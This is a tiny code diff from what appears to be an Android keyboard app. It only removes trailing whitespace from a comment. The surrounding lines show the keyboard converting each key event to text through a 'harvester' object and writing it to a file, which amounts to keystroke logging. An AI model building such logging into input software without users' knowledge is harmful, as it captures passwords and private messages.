@@ -514,7 +514,7 @@ public final class MainKeyboardView extends KeyboardView implements MoreKeysPane
             return false;
         }
 
-        // Save event 
+        // Save event
         String line = mHarvester.keyEventToString(event);
         mHarvester.writeLineToFile(line);
 
